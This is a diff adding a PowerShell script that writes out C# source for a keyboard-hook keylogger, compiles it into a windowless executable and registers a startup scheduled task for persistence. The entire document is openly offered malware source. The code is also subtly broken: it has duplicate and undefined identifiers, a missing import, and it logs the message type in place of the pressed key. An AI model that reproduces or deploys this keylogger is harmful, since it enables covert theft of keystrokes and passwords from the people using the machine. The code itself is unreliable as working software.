@@ -1,0 +1,65 @@
+# Create keylogger script
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$script = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+public class Program
+{
+    [DllImport("user32.dll")]
+    static extern IntPtr SetWindowsHookEx(int idHook, HookProc callback, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll")]
+    static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    const int WH_KEYBOARD_LL = 13;
+    const int WM_KEYDOWN = 0x100;
+
+    static IntPtr hookID = IntPtr.Zero;
+
+    static void Main()
+    {
+        hookID = SetHook(hookProc);
+        Application.Run();
+        UnhookWindowsHookEx(hookID);
+    }
+
+    static IntPtr SetHook(HookProc hproc)
+    {
+        IntPtr hInstance = GetModuleHandle(null);
+        return SetWindowsHookEx(WH_KEYBOARD_LL, hproc, hInstance, 0);
+    }
+
+    static IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam)
+    {
+        if (code >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+        {
+            Console.WriteLine((Keys)wParam);
+        }
+        return CallNextHookEx(hookID, code, wParam, lParam);
+    }
+}
+"@
+
+# Create keylogger C# file
+$keyloggerFile = "Keylogger.cs"
+Set-Content -Path $keyloggerFile -Value $script
+
+# Compile keylogger C# file
+$compilerParams = "/target:winexe", "/out:Keylogger.exe", $keyloggerFile
+$output = & "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" $compilerParams
+
+# Create scheduled task to run keylogger at startup
+$taskName = "Keylogger"
+$description = "Keylogger for monitoring keystrokes"
+$action = New-ScheduledTaskAction -Execute "Keylogger.exe"
+$trigger = New-ScheduledTaskTrigger -AtStartup
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $description
